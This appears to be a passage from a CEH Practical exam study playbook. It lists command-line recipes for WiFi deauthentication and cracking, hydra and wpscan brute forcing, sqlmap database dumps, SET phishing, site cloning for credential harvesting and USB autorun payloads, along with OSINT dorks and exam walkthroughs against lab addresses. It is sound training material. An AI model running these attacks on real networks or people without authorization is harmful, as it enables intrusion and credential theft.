airodump-ng -c <channel> --bssid <BSSID> -w capture wlan0mon

# Deauthentication attack (to capture handshake)
aireplay-ng -0 5 -a <BSSID> -c <CLIENT_MAC> wlan0mon

# Crack WPA/WPA2
aircrack-ng -w /usr/share/wordlists/rockyou.txt capture-01.cap

# Crack WEP
aircrack-ng capture-01.cap
```

### Exam Scenario - Crack WiFi Password

```bash
# Given: WirelessCapture.cap file

# Crack WPA/WPA2 handshake
aircrack-ng -w /usr/share/wordlists/rockyou.txt WirelessCapture.cap

# If WEP
aircrack-ng WirelessCapture.cap

# Answer will be the WiFi password in specified format
```

---

## 🦠 Malware Analysis

### Static Analysis Tools

```bash
# Detect It Easy (DIE)
# Used to identify file type, entropy, packers

# Usage:
# 1. Open binary in DIE
# 2. Check entropy values
# 3. Identify sections with high entropy (potential malware)

# Strings analysis
strings malware.exe | grep -i password
strings -n 10 malware.exe                  # Strings > 10 chars

# File type identification
file malware.exe

# PE Analysis
readpe malware.exe
```

### Entropy Analysis

```bash
# High entropy (> 7.0) indicates:
# - Packed/encrypted content
# - Potential malware
# - Compressed data

# Tools:
# - Detect It Easy (DIE)
# - PEiD
# - binwalk

# Exam question format:
# "Find the hash of file with highest entropy"
# Use DIE to find entropy values
# Calculate hash of identified file
```

### Binary Analysis

```bash
# Ghidra (reverse engineering)
ghidraRun

# Radare2
r2 malware.exe
aaa                                        # Analyze all
pdf @main                                  # Print disassembly of main
iz                                         # List strings

# Find entry point
readelf -h binary | grep Entry
objdump -f binary | grep start
```

### Sandbox Analysis

```
Online sandboxes:
- VirusTotal (https://virustotal.com)
- Any.Run (https://any.run)
- Hybrid Analysis (https://hybrid-analysis.com)
- Joe Sandbox (https://www.joesandbox.com)
```

---

## 🔎 OSINT & Reconnaissance

### Passive Reconnaissance

```bash
# WHOIS lookup
whois domain.com
whois 192.168.1.10

# DNS reconnaissance
dig domain.com any                        # All records
dig domain.com mx                         # Mail servers
dig domain.com ns                         # Name servers
dig domain.com txt                        # TXT records
host -t any domain.com

# Reverse DNS
dig -x 192.168.1.10
host 192.168.1.10

# Subdomain enumeration
subfinder -d domain.com
amass enum -passive -d domain.com
assetfinder --subs-only domain.com

# Certificate transparency logs
curl "https://crt.sh/?q=%.domain.com&output=json" | jq -r '.[].name_value' | sort -u
```

### Website Reconnaissance

```bash
# Technology fingerprinting
whatweb http://192.168.1.10
wappalyzer                               # Browser extension

# Website cloning
wget -r -k -l 5 -p -E -nc http://192.168.1.10
httrack http://192.168.1.10

# Robots.txt and sitemap
curl http://192.168.1.10/robots.txt
curl http://192.168.1.10/sitemap.xml

# Extract links
lynx -dump http://192.168.1.10 | grep -E 'http|https'

# Screenshot websites
cutycapt --url=http://192.168.1.10 --out=screenshot.png
eyewitness --web -f urls.txt
```

### Email Harvesting

```bash
# theHarvester
theHarvester -d domain.com -b all
theHarvester -d domain.com -b google,linkedin,bing

# Email format patterns
firstname.lastname@domain.com
flastname@domain.com
firstnamel@domain.com
firstname@domain.com
```

### Google Dorking

```bash
# Common dorks
site:domain.com                           # Limit to domain
filetype:pdf site:domain.com              # Find PDFs
intitle:"index of"                        # Directory listings
inurl:admin                               # Admin pages
"password" filetype:txt site:domain.com   # Password files
ext:sql intext:password                   # SQL files with passwords
intext:"@domain.com"                      # Email addresses

# Sensitive file discovery
filetype:log site:domain.com
filetype:conf site:domain.com
filetype:bak site:domain.com
filetype:sql site:domain.com
filetype:env site:domain.com

# Vulnerable systems
inurl:"wp-admin"                          # WordPress admin
intitle:"phpMyAdmin"                      # phpMyAdmin
inurl:"/cgi-bin/"                        # CGI scripts
```

### Social Engineering Resources

```bash
# LinkedIn enumeration
# Search company employees
# Identify email patterns
# Map organizational structure

# Maltego
# Visual link analysis
# Automated OSINT gathering
# Infrastructure mapping

# SpiderFoot
spiderfoot -s domain.com -t all
```

---

## 🎭 Social Engineering Toolkit (SET)

### SET Menu Options

```bash
# Launch SET
setoolkit

# Main menu options:
# 1) Social-Engineering Attacks
# 2) Penetration Testing (Fast-Track)
# 3) Third Party Modules
# 4) Update the Social-Engineer Toolkit

# Social Engineering Attacks:
# 1) Spear-Phishing Attack Vectors
# 2) Website Attack Vectors
# 3) Infectious Media Generator
# 4) Create a Payload and Listener
# 5) Mass Mailer Attack
# 6) Arduino-Based Attack Vector
# 7) Wireless Access Point Attack
# 8) QRCode Generator Attack
# 9) Powershell Attack Vectors
# 10) SMS Spoofing Attack
```

### Credential Harvester

```bash
# SET → Social Engineering Attacks → Website Attack Vectors → Credential Harvester

# Options:
# 1) Web Templates - Pre-built login pages (Google, Facebook, etc.)
# 2) Site Cloner - Clone any website
# 3) Custom Import - Import your own HTML

# Steps for Site Cloner:
# 1. Select option 2 (Site Cloner)
# 2. Enter your IP (listener)
# 3. Enter target URL to clone
# 4. Send phishing link to victim
# 5. Credentials logged when victim enters them
```

### Phishing Attack

```bash
# Spear Phishing Attack
# SET → Social Engineering Attacks → Spear-Phishing Attack Vectors

# Options:
# 1) Perform a Mass Email Attack
# 2) Create a FileFormat Payload
# 3) Create a Social-Engineering Template

# Mass Email Attack:
# 1. Select payload (PDF, DOC, etc.)
# 2. Configure listener
# 3. Enter target email(s)
# 4. Configure SMTP server
# 5. Send attack emails
```

### Infectious Media Generator

```bash
# Create autorun payloads for USB drives
# SET → Social Engineering Attacks → Infectious Media Generator

# Creates:
# - Metasploit payloads
# - Autorun.inf file
# - Ready-to-copy USB attack
```

---

## ❓ Common Exam Questions

### Question Types and Approaches

#### 1. Network Discovery
```
Q: "What is the IP of the Windows X machine?"
A: nmap -O 192.168.1.0/24 | grep -A 5 Windows
```

#### 2. Service Identification
```
Q: "Which host has MySQL service running?"
A: nmap -p 3306 192.168.1.0/24 | grep -B 5 open
```

#### 3. FTP Credentials
```
Q: "Find FTP username and password"
A: hydra -L users.txt -P passwords.txt ftp://192.168.1.10
```

#### 4. WordPress Password
```
Q: "Crack the WordPress admin password"
A: wpscan --url http://192.168.1.10:8080/CEH/ -U admin -P wordlist.txt
```

#### 5. SQL Injection
```
Q: "Extract user X's password from the database"
A: sqlmap -u "URL?id=1" --cookie="..." -D db -T users -C password --dump --where="username='X'"
```

#### 6. Steganography
```
Q: "Extract hidden message from image"
A: steghide extract -sf image.jpg -p password
   OR: OpenStego (Windows)
```

#### 7. Cryptography
```
Q: "Decrypt the file/message using VeraCrypt"
A: Mount volume with VeraCrypt, enter password, access decrypted content
```

#### 8. Wireshark Analysis
```
Q: "Find the attacker IP in DDoS attack"
A: Statistics → Conversations → Sort by packets → Identify top source

Q: "Identify credentials in PCAP"
A: Follow TCP Stream on HTTP POST or FTP traffic
```

#### 9. Hash Cracking
```
Q: "Crack this MD5 hash"
A: john --format=raw-md5 --wordlist=rockyou.txt hash.txt
   hashcat -m 0 hash.txt rockyou.txt
```

#### 10. Android Exploitation
```
Q: "Retrieve file from Android device"
A: adb connect IP:5555
   adb pull /sdcard/path/file.txt
```

#### 11. RDP Access
```
Q: "Which hosts have RDP enabled?"
A: nmap -p 3389 192.168.1.0/24 | grep -B 5 open
```

#### 12. Wireless Cracking
```
Q: "Crack WiFi password from capture"
A: aircrack-ng -w rockyou.txt capture.cap
```

#### 13. File Entropy
```
Q: "Find hash of file with highest entropy"
A: Use DIE to check entropy → Calculate hash with md5sum/sha256sum
```

#### 14. Covert Channel
```
Q: "Decode covert TCP message"
A: Analyze Wireshark → Check IP ID field → Convert hex to ASCII
```

#### 15. SNMP Enumeration
```
Q: "Find the machine name via SNMP"
A: snmpwalk -v2c -c public 192.168.1.10 system
   Look for sysName in output
```

#### 16. LDAP Information Extraction
```
Q: "Find users in the Active Directory"
A: ldapsearch -x -H ldap://192.168.1.10 -b "dc=domain,dc=com" "(objectClass=user)" sAMAccountName
```

#### 17. DNS Zone Transfer
```
Q: "Extract DNS records from the server"
A: dig axfr @192.168.1.10 domain.com
   Or: dnsrecon -d domain.com -t axfr
```

#### 18. SSH Credential Attack
```
Q: "Find SSH credentials for the server"
A: hydra -l root -P /path/wordlist.txt ssh://192.168.1.10
   Or: nmap --script ssh-brute -p 22 192.168.1.10
```

#### 19. Hash Type Identification
```
Q: "Identify the hash type"
A: hash-identifier → paste hash
   Or: hashid -m hash_value (shows hashcat mode)
   32 chars = MD5/NTLM, 40 chars = SHA1, 64 chars = SHA256
```

#### 20. VeraCrypt Volume Decryption
```
Q: "Access the encrypted volume and find the secret"
A: veracrypt --mount /path/volume /mnt/point
   Enter password when prompted
   Browse to /mnt/point and read secret file
```

### Exam Scenario Walkthroughs

#### Complete SQL Injection Scenario
```bash
# Given: Web application at http://192.168.1.10/dvwa/

# Step 1: Login to DVWA
Username: admin, Password: password

# Step 2: Set security to low
DVWA Security → Low → Submit

# Step 3: Get cookies from browser (F12 → Network → Cookie)
# PHPSESSID=abc123; security=low

# Step 4: Find databases
sqlmap -u "http://192.168.1.10/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit" \
  --cookie="PHPSESSID=abc123; security=low" --dbs

# Step 5: Enumerate tables
sqlmap -u "URL" --cookie="..." -D dvwa --tables

# Step 6: Dump users table
sqlmap -u "URL" --cookie="..." -D dvwa -T users --dump

# Answer: Password from the dump (may need to crack MD5 hash)
```

#### Complete WordPress Attack Scenario
```bash
# Given: WordPress at http://192.168.1.10:8080/CEH/

# Step 1: Enumerate users
wpscan --url http://192.168.1.10:8080/CEH/ --enumerate u

# Step 2: Find username (e.g., admin)

# Step 3: Password attack
wpscan --url http://192.168.1.10:8080/CEH/ \
  -U admin -P /root/Desktop/wordlists/passwords.txt

# Answer: admin:password123 (example)
```

#### Complete Android ADB Scenario
```bash
# Given: Find secret file on Android device

# Step 1: Scan for ADB port
nmap -p 5555 192.168.1.0/24

# Step 2: Connect to device (e.g., 192.168.1.20)
adb connect 192.168.1.20:5555

# Step 3: List files
adb shell ls /sdcard/

# Step 4: Find and pull secret file
adb shell find /sdcard -name "*.txt" 2>/dev/null
adb pull /sdcard/Download/secret.txt /root/Desktop/

# Answer: Content of the secret file
```

#### Complete Steganography Scenario
```bash
# Given: image.jpg on Desktop, find hidden message

# Step 1: Analyze the file
file image.jpg
exiftool image.jpg
strings image.jpg | tail -20

# Step 2: Try extraction with common passwords
steghide extract -sf image.jpg -p ""          # No password
steghide extract -sf image.jpg -p "password"
steghide extract -sf image.jpg -p "secret"

# Step 3: If JPEG fails, check if it's PNG (use zsteg)
zsteg image.png

# Step 4: Read extracted file
cat extracted.txt

# Answer: Content of hidden message
```

#### Complete Wireshark Credential Extraction
```bash
# Given: capture.pcap file, find FTP credentials

# Step 1: Open in Wireshark
wireshark capture.pcap

# Step 2: Filter for FTP
Filter: ftp

# Step 3: Find USER and PASS commands
Look for packets with "Request: USER xxx"
Look for packets with "Request: PASS xxx"

# Or use tshark:
tshark -r capture.pcap -Y "ftp.request.command == USER || ftp.request.command == PASS" -T fields -e ftp.request.arg

# Answer: username:password
```

#### Complete Hash Cracking Scenario
```bash
# Given: MD5 hash 5f4dcc3b5aa765d61d8327deb882cf99

# Step 1: Identify hash type
hashid 5f4dcc3b5aa765d61d8327deb882cf99
# Result: MD5

# Step 2: Check online databases first
# https://crackstation.net/

# Step 3: If not found, crack with hashcat
echo "5f4dcc3b5aa765d61d8327deb882cf99" > hash.txt
hashcat -m 0 hash.txt /usr/share/wordlists/rockyou.txt

# Or with John:
john --format=raw-md5 --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
john --show hash.txt

# Answer: password (in this example)
```

---

## 🎯 Exam Strategy & Tips

### Time Management

```
┌─────────────────────────────────────────────────────────────┐
│                 RECOMMENDED TIME ALLOCATION                  │
├─────────────────────────────────────────────────────────────┤
│  First 30 minutes:                                          │
│  • Network discovery and enumeration                        │
│  • Save scan results for later reference                    │
│                                                              │
│  Next 4 hours:                                              │
│  • Work through questions (~12 mins each)                   │
│  • Skip difficult questions, return later                   │
│                                                              │
│  Final 1.5 hours:                                           │
│  • Return to skipped questions                              │
│  • Verify answers                                           │
│  • Double-check format requirements                         │
└─────────────────────────────────────────────────────────────┘
```

#### During Exam
1. **Read questions carefully** - Note answer format hints (AA, aa, 00, **)
2. **Run initial scans first** - Save to files for reference
3. **Use Google wisely** - It's open book, search for tool syntax
4. **Don't get stuck** - Skip and return to difficult questions
5. **Check both VMs** - Some tools are only on Windows
6. **Take notes** - Document IP addresses, usernames, findings
7. **Verify answers** - Match format requirements exactly

#### Common Mistakes to Avoid
- ❌ Forgetting to check answer format
- ❌ Not saving scan results
- ❌ Spending too long on one question
- ❌ Missing wordlists location
- ❌ Using wrong tool syntax
- ❌ Not checking both Parrot and Windows VMs

### Answer Format Examples

```
Question hints → Your answer format

"The password is in format AAaa00"
→ Answer: ABcd12

"IP address of the machine"
→ Answer: 192.168.1.10

"MD5 hash of the file"
→ Answer: d41d8cd98f00b204e9800998ecf8427e

"Username in lowercase"
→ Answer: admin (not ADMIN or Admin)
```

---

## 📚 Practice Labs & Resources

### TryHackMe Rooms (Free)

| Room | Focus Area |
|------|------------|
| [Linux Fundamentals](https://tryhackme.com/room/linuxfundamentalspart1) | Linux basics |
| [Nmap](https://tryhackme.com/room/furthernmap) | Network scanning |
| [Metasploit](https://tryhackme.com/room/metasploitintro) | Exploitation |
| [Hydra](https://tryhackme.com/room/hydra) | Password cracking |
| [SQLMap](https://tryhackme.com/room/sqlmap) | SQL injection |
| [DVWA](https://tryhackme.com/room/dvwa) | Web attacks |
| [Wireshark](https://tryhackme.com/room/wireshark) | Packet analysis |
| [Crack The Hash](https://tryhackme.com/room/crackthehash) | Hash cracking |
| [Ice](https://tryhackme.com/room/ice) | Windows exploitation |
| [Lian Yu](https://tryhackme.com/room/lianyu) | CTF practice |
| [Basic Pentesting](https://tryhackme.com/room/basicpentestingjt) | Full pentest |

### HackTheBox

- Easy to Medium machines
- Challenges: Steganography, Web, Crypto
- Focus on retired machines with walkthroughs

### Official Resources

- **EC-Council iLabs** - Official practice environment
- **CEH v13 Courseware** - Study material
- **CEH Practical Lab Manual** - Step-by-step labs

### YouTube Resources

- iLab walkthrough videos
- CEH Practical preparation guides
- Tool tutorials (Nmap, Metasploit, SQLMap)

### GitHub Resources

- [Guide-CEH-Practical-Master](https://github.com/CyberSecurityUP/Guide-CEH-Practical-Master)
- [CEH-Practical-Notes-and-Tools](https://github.com/DarkLycn1976/CEH-Practical-Notes-and-Tools)
- [CEH_CHEAT_SHEET](https://github.com/System-CTL/CEH_CHEAT_SHEET)

### Books

- "CEH All-in-One Exam Guide" by Matt Walker
- "CEH Certified Ethical Hacker Study Guide"
- "The Web Application Hacker's Handbook"

---

### During Exam - First 30 Minutes

```bash
# Execute these immediately:

# 1. Discover all subnets
nmap -sn 10.10.10.0/24 -oN hosts_10.txt
nmap -sn 172.16.0.0/24 -oN hosts_172.txt
nmap -sn 192.168.0.0/24 -oN hosts_192.txt

# 2. Identify live hosts
cat hosts_*.txt | grep "Nmap scan report"

# 3. Full scan on key targets
nmap -sC -sV -O -p- <target_ip> -oN full_scan.txt

# 4. Organize findings
# Create notes file with:
# - IP addresses
# - Open ports
# - Services
# - OS versions
```

---

## 📝 Quick Command Reference Card

```
╔══════════════════════════════════════════════════════════════════╗
║                    CEH PRACTICAL QUICK REFERENCE                  ║
╠══════════════════════════════════════════════════════════════════╣
║ SCANNING                                                          ║
║ nmap -sn 192.168.1.0/24              Host discovery               ║
║ nmap -sC -sV -O 192.168.1.10         Full scan                    ║
║ nmap -p 21,22,80,3389 192.168.1.0/24 Specific ports               ║
╠══════════════════════════════════════════════════════════════════╣
║ PASSWORD CRACKING                                                 ║
║ hydra -l admin -P list.txt ftp://IP  FTP brute force              ║
║ john --format=raw-md5 hash.txt       Crack MD5                    ║
║ hashcat -m 0 hash.txt wordlist.txt   Hashcat MD5                  ║
╠══════════════════════════════════════════════════════════════════╣
║ SQL INJECTION                                                     ║
║ sqlmap -u "URL?id=1" --dbs           Get databases                ║
║ sqlmap -u "URL" -D db -T tbl --dump  Dump table                   ║
╠══════════════════════════════════════════════════════════════════╣
║ WORDPRESS                                                         ║
║ wpscan --url URL --enumerate u       Enumerate users              ║
║ wpscan --url URL -U user -P list     Password attack              ║
╠══════════════════════════════════════════════════════════════════╣
║ STEGANOGRAPHY                                                     ║
║ steghide extract -sf image.jpg       Extract hidden data          ║
║ OpenStego (Windows GUI)              Alternative tool             ║
║ Snow.exe -C -p "pass" file.txt       Whitespace stego             ║
╠══════════════════════════════════════════════════════════════════╣
║ CRYPTOGRAPHY                                                      ║
║ md5sum file.txt                      Calculate MD5                ║
║ VeraCrypt - Mount encrypted volume   Disk encryption              ║
║ CryptTool - Decrypt messages         Windows GUI                  ║
╠══════════════════════════════════════════════════════════════════╣
║ WIRESHARK FILTERS                                                 ║
║ ip.addr == 192.168.1.10              Filter by IP                 ║
║ tcp.port == 80                       Filter by port               ║
║ http.request.method == "POST"        POST requests                ║
╠══════════════════════════════════════════════════════════════════╣
║ METASPLOIT                                                        ║
║ msfconsole                           Start Metasploit             ║
║ use auxiliary/scanner/smb/smb_login  SMB login scanner            ║
║ set RHOSTS IP; run                   Execute module               ║
╠══════════════════════════════════════════════════════════════════╣
║ ANDROID                                                           ║
║ adb connect IP:5555                  Connect to device            ║
║ adb pull /sdcard/file.txt ./         Download file                ║
╠══════════════════════════════════════════════════════════════════╣
║ WIRELESS                                                          ║
║ aircrack-ng -w wordlist capture.cap  Crack WiFi password          ║
╚══════════════════════════════════════════════════════════════════╝
```

---

## 📄 License

This playbook is provided for educational purposes only. Use these techniques only in authorized environments and with proper permission.

---
